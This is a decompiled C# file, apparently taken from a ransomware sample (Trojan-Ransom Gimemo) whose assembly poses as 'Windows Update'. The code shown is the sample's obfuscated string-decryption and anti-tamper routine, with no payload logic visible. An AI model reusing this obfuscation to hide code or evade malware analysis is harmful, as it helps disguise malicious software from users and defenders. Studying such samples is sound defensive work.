// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Windows Update, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AD392BA1-9C14-4DFE-974F-DF263E483990
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Trojan-Ransom.Win32.Gimemo.wxj-0ca921544c9054361bc16e568e27aab3c46187149d7919afc9cfc91c5f59efb7.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;

internal static class \u0002\u2000
{
  private static int \u0002\u2000;
  private static \u0002\u2000.\u0005\u2004\u2007\u200A\u2004\u2006\u2000\u2000\u2001\u2007\u2004\u200A\u2006\u2007\u2003\u2003\u2009\u2002\u2000\u2001\u2007\u2006\u2005\u2007\u2000\u2001 \u0002;
  private static byte[] \u000E;
  private static \u0002\u2000.\u0003\u2000\u2002\u2001\u2002\u2004\u2007\u2001\u2006\u2007\u2006\u200A\u2007\u2005\u2005\u2000​\u2007\u2003\u2006 \u0003;
  private static int \u000F;
  private static int \u0006;
  private static byte[] \u0005;
  private static \u0002\u2000.\u000E\u2007​\u2003\u2003\u2000\u2004​\u2008\u2009\u2001\u2009\u2007 \u0003\u2000;
  private static short \u0008;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static \u0002\u2000()
  {
    int num1 = -1402076058;
    int num2 = -2133102561 ^ num1;
    \u0002\u2000.\u0002 = new \u0002\u2000.\u0005\u2004\u2007\u200A\u2004\u2006\u2000\u2000\u2001\u2007\u2004\u200A\u2006\u2007\u2003\u2003\u2009\u2002\u2000\u2001\u2007\u2006\u2005\u2007\u2000\u2001(20);
    int skipFrames = 1;
    StackTrace stackTrace = new StackTrace(skipFrames, false);
    int index = skipFrames - 1;
    StackFrame frame = stackTrace.GetFrame(index);
    int num3 = -~-~-~~-~(-948603559 - num1 - num2) ^ -~-~~--~~((num1 ^ 1828596162) + num2);
    MethodBase methodBase = frame == null ? (MethodBase) null : frame.GetMethod();
    if (frame != null)
      num3 ^= ~--~~-~-~(-966166308 - num1 - num2);
    Type type = (object) methodBase == null ? (Type) null : methodBase.DeclaringType;
    int num4;
    if ((object) type == (object) typeof (RuntimeMethodHandle))
    {
      num4 = num3 ^ (num1 - 2142801160 ^ num2) + index;
      \u0002\u2000.\u0003\u2000 = (\u0002\u2000.\u000E\u2007​\u2003\u2003\u2000\u2004​\u2008\u2009\u2001\u2009\u2007) 4 | \u0002\u2000.\u0003\u2000;
    }
    else if ((object) type == null)
    {
      \u0002\u2000.\u0003\u2000 = (\u0002\u2000.\u000E\u2007​\u2003\u2003\u2000\u2004​\u2008\u2009\u2001\u2009\u2007) 1 | \u0002\u2000.\u0003\u2000;
      num4 = num3 ^ -~-~~--~~-~((num1 ^ -2133137499) - num2);
    }
    else if ((object) type.Assembly != (object) typeof (\u0002\u2000).Assembly)
    {
      \u0002\u2000.\u0003\u2000 = (\u0002\u2000.\u000E\u2007​\u2003\u2003\u2000\u2004​\u2008\u2009\u2001\u2009\u2007) 2 | \u0002\u2000.\u0003\u2000;
      num4 = num3 ^ 1529938474 + num1 ^ num2;
    }
    else
    {
      num4 = num3 ^ -~~-~-~-~(-652010760 - num1 - num2) - index;
      \u0002\u2000.\u0003\u2000 |= (\u0002\u2000.\u000E\u2007​\u2003\u2003\u2000\u2004​\u2008\u2009\u2001\u2009\u2007) 16;
    }
    \u0002\u2000.\u0002\u2000 = num4 + \u0002\u2000.\u0002\u2000;
  }

  private static void \u0002(byte[] _param0, int _param1, byte[] _param2)
  {
    int num1 = 0;
    int num2 = 0;
    int num3 = 128;
    int length = _param2.Length;
label_10:
    while (num1 < length)
    {
      if ((num3 <<= 1) == 256)
      {
        num3 = 1;
        num2 = (int) _param0[_param1++];
      }
      if ((num2 & num3) != 0)
      {
        int num4 = ((int) _param0[_param1] >> 2) + 3;
        int num5 = ((int) _param0[_param1] << 8 | (int) _param0[_param1 + 1]) & 1023;
        _param1 += 2;
        int num6 = num1 - num5;
        if (num6 < 0)
          break;
        while (true)
        {
          if (--num4 >= 0 && num1 < length)
            _param2[num1++] = _param2[num6++];
          else
            goto label_10;
        }
      }
      else
        _param2[num1++] = _param0[_param1++];
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static string \u0002(int _param0)
  {
    int num1 = 61042950;
    int num2 = num1 - 1573985226;
    lock (\u0002\u2000.\u0002)
    {
      string str1;
      byte[] numArray1;
      int num3;
      while (true)
      {
        str1 = \u0002\u2000.\u0002.\u0002(_param0);
        if (str1 == null)
        {
          int num4;
          if (\u0002\u2000.\u0003 == null)
          {
            Assembly executingAssembly = Assembly.GetExecutingAssembly();
            Assembly.GetCallingAssembly();
            \u0002\u2000.\u0006 |= -1450288956 - num1 - num2;
            Assembly assembly1 = executingAssembly;
            StringBuilder stringBuilder = new StringBuilder();
            int num5 = num1 ^ -2039217101 ^ num2;
            stringBuilder.Append((char) (num5 >> 16)).Append((char) num5);
            int num6 = -914626998 - num1 - num2;
            stringBuilder.Append((char) (num6 >> 16)).Append((char) num6);
            int num7 = num1 - 2110716881 ^ num2;
            stringBuilder.Append((char) num7).Append((char) (num7 >> 16));
            int num8 = (num1 ^ -964819902) - num2;
            stringBuilder.Append((char) num8).Append((char) (num8 >> 16));
            int num9 = 2110864330 - num1 + num2;
            stringBuilder.Append((char) num9).Append((char) (num9 >> 16));
            int num10 = num1 - 1036385222 - num2;
            stringBuilder.Append((char) (num10 >> 16)).Append((char) num10);
            int num11 = (1502526403 ^ num1) + num2;
            stringBuilder.Append((char) num11);
            string name = stringBuilder.ToString();
            Stream manifestResourceStream = assembly1.GetManifestResourceStream(name);
            int skipFrames = 1;
            StackTrace stackTrace = new StackTrace(skipFrames, false);
            \u0002\u2000.\u0006 ^= -1451901568 - num1 ^ num2 | skipFrames;
            int index = skipFrames - 1;
            StackFrame frame = stackTrace.GetFrame(index);
            MethodBase methodBase = frame == null ? (MethodBase) null : frame.GetMethod();
            \u0002\u2000.\u0006 ^= index + (1451899454 + num1 + num2);
            Type type = (object) methodBase == null ? (Type) null : methodBase.DeclaringType;
            if (frame == null)
              \u0002\u2000.\u0006 ^= (-1502159639 ^ num1) - num2;
            bool flag = (object) type == (object) typeof (RuntimeMethodHandle);
            \u0002\u2000.\u0006 ^= -1451899230 - num1 ^ num2;
            if (!flag)
            {
              flag = (object) type == null;
              if (flag)
                \u0002\u2000.\u0006 ^= (num1 ^ -1502159671) - num2;
            }
            if (flag == (stackTrace != null))
              \u0002\u2000.\u0006 ^= 32;
            \u0002\u2000.\u0006 ^= -1451901600 - num1 ^ num2 | 1 + index;
            \u0002\u2000.\u0003 = new \u0002\u2000.\u0003\u2000\u2002\u2001\u2002\u2004\u2007\u2001\u2006\u2007\u2006\u200A\u2007\u2005\u2005\u2000​\u2007\u2003\u2006(manifestResourceStream);
            short num12 = (short) ((int) \u0002\u2000.\u0003.\u0002() ^ (int) (short) ~-~-~--~~-~(num1 + 1451880962 + num2));
            if (num12 == (short) 0)
              \u0002\u2000.\u0008 = (short) ((int) \u0002\u2000.\u0003.\u0002() ^ (int) (short) -~~-~-~--~~((num1 ^ -1502489251) - num2));
            else
              \u0002\u2000.\u0005 = \u0002\u2000.\u0003.\u0002((int) num12);
            Assembly assembly2 = executingAssembly;
            AssemblyName assemblyName;
            try
            {
              assemblyName = assembly2.GetName();
            }
            catch
            {
              assemblyName = new AssemblyName(assembly2.FullName);
            }
            \u0002\u2000.\u000E = assemblyName.GetPublicKeyToken();
            if (\u0002\u2000.\u000E != null && \u0002\u2000.\u000E.Length == 0)
              \u0002\u2000.\u000E = (byte[]) null;
            int num13 = \u0002\u2000.\u0002\u2000;
            \u0002\u2000.\u0002\u2000 = 0;
            num4 = num13 ^ -408346607 - num1 ^ num2 ^ (int) (uint) \u0005\u2000.\u0002() ^ num1 - 1368760180 - num2 ^ 1574700284 - num1 + num2 + -~-~-~-~~-~(num1 + 1451899622 ^ num2) ^ -~-~-~-~~-~(666372362 - num1 - num2);
            \u0002\u2000.\u0006 = \u0002\u2000.\u0006 & (1770969904 ^ num1) + num2 ^ -1451900738 - num1 ^ num2;
            \u0002\u2000.\u000F = num4;
            if ((\u0002\u2000.\u0003\u2000 & (\u0002\u2000.\u000E\u2007​\u2003\u2003\u2000\u2004​\u2008\u2009\u2001\u2009\u2007) ~-~--~~--~~((num1 ^ 1502534580) + num2)) == (\u0002\u2000.\u000E\u2007​\u2003\u2003\u2000\u2004​\u2008\u2009\u2001\u2009\u2007) 0)
              \u0002\u2000.\u0006 = num1 - 1573941888 ^ num2;
          }
          else
            num4 = \u0002\u2000.\u000F;
          if (\u0002\u2000.\u0006 != -1451855364 - num1 - num2)
          {
            int num14 = _param0 ^ (num1 ^ 414714395) - num2 ^ num4 ^ num1 - 1480898185 + num2;
            \u0002\u2000.\u0003.\u0002().Position = (long) num14;
            if (\u0002\u2000.\u0005 != null)
            {
              numArray1 = \u0002\u2000.\u0005;
            }
            else
            {
              short num15 = \u0002\u2000.\u0008 != (short) -1 ? \u0002\u2000.\u0008 : (short) ((int) \u0002\u2000.\u0003.\u0002() ^ 1502515278 ^ num1 ^ num2 ^ num14);
              if (num15 == (short) 0)
              {
                numArray1 = (byte[]) null;
              }
              else
              {
                numArray1 = \u0002\u2000.\u0003.\u0002((int) num15);
                for (int index = 0; index != numArray1.Length; ++index)
                  numArray1[index] ^= (byte) (\u0002\u2000.\u000F >> ((3 & index) << 3));
              }
            }
            num3 = \u0002\u2000.\u0003.\u0002() ^ num14 ^ -~~--~-~-~~(num1 + 178964540 + num2) ^ num4;
            if (num3 == (num1 ^ 1502534596 | num2))
            {
              byte[] numArray2 = \u0002\u2000.\u0003.\u0002(4);
              _param0 = num1 - 301050438 - num2 ^ num4;
              _param0 = ((int) numArray2[2] | (int) numArray2[3] << 16 | (int) numArray2[0] << 8 | (int) numArray2[1] << 24) ^ -_param0;
            }
            else
              goto label_33;
          }
          else
            goto label_23;
        }
        else
          break;
      }
      return str1;
label_23:
      return new string(new char[3]
      {
        (char) ((1502534170 ^ num1) + num2),
        '0',
        (char) (-1451899286 - num1 ^ num2)
      });
label_33:
      bool flag1 = (num3 & (-1988770238 - num1 ^ num2)) != 0;
      bool flag2 = (num3 & (num1 ^ -1718690878) + num2) != 0;
      bool flag3 = (num3 & (-644949054 ^ num1) + num2) != 0;
      int num16 = num3 & (num1 - 1500890691 ^ num2);
      byte[] numArray3 = \u0003\u2000.\u0002(numArray1, \u0002\u2000.\u0003.\u0002(num16));
      if (\u0002\u2000.\u000E != null != (\u0002\u2000.\u0006 != -1450291512 - num1 - num2))
      {
        for (int index = 0; index < num16; ++index)
        {
          byte num17 = \u0002\u2000.\u000E[7 & index];
          byte num18 = (byte) ((int) num17 << 3 | (int) num17 >> 5);
          numArray3[index] = (byte) ((uint) numArray3[index] ^ (uint) num18);
        }
      }
      int num19 = \u0002\u2000.\u0006 - 12;
      byte[] bytes;
      int length;
      if (!flag1)
      {
        bytes = numArray3;
        length = num16;
      }
      else
      {
        length = (int) numArray3[2] | (int) numArray3[0] << 16 | (int) numArray3[3] << 8 | (int) numArray3[1] << 24;
        bytes = new byte[length];
        \u0002\u2000.\u0002(numArray3, 4, bytes);
      }
      string str2;
      if (flag3 && num19 == (num1 ^ -1503024064 ^ num2))
      {
        char[] chArray = new char[length];
        for (int index = 0; index < length; index = 1 + index)
          chArray[index] = (char) bytes[index];
        str2 = new string(chArray);
      }
      else
        str2 = Encoding.Unicode.GetString(bytes, 0, bytes.Length);
      int num20 = num19 + (num1 - 1573985099 - num2 + (3 & num19) << 5);
      if (num20 != 1575597156 - num1 + num2)
      {
        int num21 = num16 + _param0 ^ num1 - 1573343682 ^ num2 ^ num20 & 1573986519 - num1 + num2;
        ref int local = ref num21;
        StringBuilder stringBuilder = new StringBuilder();
        int num22 = (num1 ^ -1502534510) - num2;
        stringBuilder.Append((char) (byte) num22);
        string format = stringBuilder.ToString();
        str2 = local.ToString(format);
      }
      if (!flag2)
      {
        str2 = string.Intern(str2);
        \u0002\u2000.\u0002.\u0002(_param0, str2);
        if (\u0002\u2000.\u0002.\u0002() == 20)
        {
          \u0002\u2000.\u0003.\u0003();
          \u0002\u2000.\u0003 = (\u0002\u2000.\u0003\u2000\u2002\u2001\u2002\u2004\u2007\u2001\u2006\u2007\u2006\u200A\u2007\u2005\u2005\u2000​\u2007\u2003\u2006) null;
          \u0002\u2000.\u0005 = \u0002\u2000.\u000E = (byte[]) null;
        }
      }
      return str2;
    }
  }

  private sealed class \u0003\u2000\u2002\u2001\u2002\u2004\u2007\u2001\u2006\u2007\u2006\u200A\u2007\u2005\u2005\u2000​\u2007\u2003\u2006
  {
    private Stream \u0002;
    private byte[] \u0003;

    public \u0003\u2000\u2002\u2001\u2002\u2004\u2007\u2001\u2006\u2007\u2006\u200A\u2007\u2005\u2005\u2000​\u2007\u2003\u2006(
      Stream _param1)
    {
      this.\u0002 = _param1;
      this.\u0003 = new byte[4];
    }

    public Stream \u0002() => this.\u0002;

    public short \u0002()
    {
      this.\u0002(2);
      return (short) ((int) this.\u0003[0] | (int) this.\u0003[1] << 8);
    }

    public int \u0002()
    {
      this.\u0002(4);
      return (int) this.\u0003[0] | (int) this.\u0003[1] << 8 | (int) this.\u0003[2] << 16 | (int) this.\u0003[3] << 24;
    }

    private void \u0002() => throw new EndOfStreamException();

    private void \u0002(int _param1)
    {
      int offset = 0;
      if (_param1 == 1)
      {
        int num = this.\u0002.ReadByte();
        if (num == -1)
          this.\u0002();
        this.\u0003[0] = (byte) num;
      }
      else
      {
        do
        {
          int num = this.\u0002.Read(this.\u0003, offset, _param1 - offset);
          if (num == 0)
            this.\u0002();
          offset += num;
        }
        while (offset < _param1);
      }
    }

    public void \u0003()
    {
      Stream stream = this.\u0002;
      this.\u0002 = (Stream) null;
      stream?.Close();
      this.\u0003 = (byte[]) null;
    }

    public byte[] \u0002(int _param1)
    {
      byte[] numArray = _param1 >= 0 ? new byte[_param1] : throw new ArgumentOutOfRangeException();
      int length = 0;
      do
      {
        int num = this.\u0002.Read(numArray, length, _param1);
        if (num != 0)
        {
          length += num;
          _param1 -= num;
        }
        else
          break;
      }
      while (_param1 > 0);
      if (length != numArray.Length)
      {
        byte[] dst = new byte[length];
        Buffer.BlockCopy((Array) numArray, 0, (Array) dst, 0, length);
        numArray = dst;
      }
      return numArray;
    }
  }

  [DefaultMember("Item")]
  internal sealed class \u0005\u2004\u2007\u200A\u2004\u2006\u2000\u2000\u2001\u2007\u2004\u200A\u2006\u2007\u2003\u2003\u2009\u2002\u2000\u2001\u2007\u2006\u2005\u2007\u2000\u2001
  {
    private \u0002\u2000.\u0005\u2004\u2007\u200A\u2004\u2006\u2000\u2000\u2001\u2007\u2004\u200A\u2006\u2007\u2003\u2003\u2009\u2002\u2000\u2001\u2007\u2006\u2005\u2007\u2000\u2001.\u0002[] \u0002;
    private int \u0003;

    public \u0005\u2004\u2007\u200A\u2004\u2006\u2000\u2000\u2001\u2007\u2004\u200A\u2006\u2007\u2003\u2003\u2009\u2002\u2000\u2001\u2007\u2006\u2005\u2007\u2000\u2001() => this.\u0002 = new \u0002\u2000.\u0005\u2004\u2007\u200A\u2004\u2006\u2000\u2000\u2001\u2007\u2004\u200A\u2006\u2007\u2003\u2003\u2009\u2002\u2000\u2001\u2007\u2006\u2005\u2007\u2000\u2001.\u0002[16];

    public \u0005\u2004\u2007\u200A\u2004\u2006\u2000\u2000\u2001\u2007\u2004\u200A\u2006\u2007\u2003\u2003\u2009\u2002\u2000\u2001\u2007\u2006\u2005\u2007\u2000\u2001(
      int _param1)
    {
      int length = 16;
      _param1 <<= 1;
      while (length < _param1 && length > 0)
        length <<= 1;
      if (length < 0)
        length = 16;
      this.\u0002 = new \u0002\u2000.\u0005\u2004\u2007\u200A\u2004\u2006\u2000\u2000\u2001\u2007\u2004\u200A\u2006\u2007\u2003\u2003\u2009\u2002\u2000\u2001\u2007\u2006\u2005\u2007\u2000\u2001.\u0002[length];
    }

    public int \u0002() => this.\u0003;

    private void \u0002()
    {
      \u0002\u2000.\u0005\u2004\u2007\u200A\u2004\u2006\u2000\u2000\u2001\u2007\u2004\u200A\u2006\u2007\u2003\u2003\u2009\u2002\u2000\u2001\u2007\u2006\u2005\u2007\u2000\u2001.\u0002[] objArray1 = this.\u0002;
      int length1 = objArray1.Length;
      int length2 = length1 * 2;
      if (length2 <= 0)
        return;
      \u0002\u2000.\u0005\u2004\u2007\u200A\u2004\u2006\u2000\u2000\u2001\u2007\u2004\u200A\u2006\u2007\u2003\u2003\u2009\u2002\u2000\u2001\u2007\u2006\u2005\u2007\u2000\u2001.\u0002[] objArray2 = new \u0002\u2000.\u0005\u2004\u2007\u200A\u2004\u2006\u2000\u2000\u2001\u2007\u2004\u200A\u2006\u2007\u2003\u2003\u2009\u2002\u2000\u2001\u2007\u2006\u2005\u2007\u2000\u2001.\u0002[length2];
      int num1 = 0;
      for (int index1 = 0; index1 < length1; ++index1)
      {
        string str = objArray1[index1].\u0003;
        if (str != null)
        {
          int num2 = objArray1[index1].\u0002;
          int index2 = num2 & length2 - 1;
          while (objArray2[index2].\u0003 != null)
          {
            ++index2;
            if (index2 >= length2)
              index2 = 0;
          }
          objArray2[index2].\u0003 = str;
          objArray2[index2].\u0002 = num2;
          ++num1;
        }
      }
      this.\u0002 = objArray2;
      this.\u0003 = num1;
    }

    public string \u0002(int _param1)
    {
      \u0002\u2000.\u0005\u2004\u2007\u200A\u2004\u2006\u2000\u2000\u2001\u2007\u2004\u200A\u2006\u2007\u2003\u2003\u2009\u2002\u2000\u2001\u2007\u2006\u2005\u2007\u2000\u2001.\u0002[] objArray = this.\u0002;
      int length = objArray.Length;
      int index = _param1 & length - 1;
      string str = (string) null;
      while (objArray[index].\u0002 != _param1)
      {
        if (objArray[index].\u0003 != null)
        {
          ++index;
          if (index >= length)
            index = 0;
        }
        else
          goto label_6;
      }
      str = objArray[index].\u0003;
label_6:
      return str;
    }

    public void \u0002(int _param1, string _param2)
    {
      \u0002\u2000.\u0005\u2004\u2007\u200A\u2004\u2006\u2000\u2000\u2001\u2007\u2004\u200A\u2006\u2007\u2003\u2003\u2009\u2002\u2000\u2001\u2007\u2006\u2005\u2007\u2000\u2001.\u0002[] objArray = this.\u0002;
      int length = objArray.Length;
      int num1 = length >> 1;
      int index = _param1 & length - 1;
      while (true)
      {
        do
        {
          int num2 = objArray[index].\u0002;
          bool flag = objArray[index].\u0003 == null;
          if (num2 == _param1 || flag)
          {
            objArray[index].\u0003 = _param2;
            if (!flag)
              return;
            objArray[index].\u0002 = _param1;
            ++this.\u0003;
            if (this.\u0003 <= num1)
              return;
            this.\u0002();
            return;
          }
          ++index;
        }
        while (index < length);
        index = 0;
      }
    }

    private struct \u0002
    {
      public int \u0002;
      public string \u0003;
    }
  }

  private enum \u000E\u2007​\u2003\u2003\u2000\u2004​\u2008\u2009\u2001\u2009\u2007
  {
  }
}
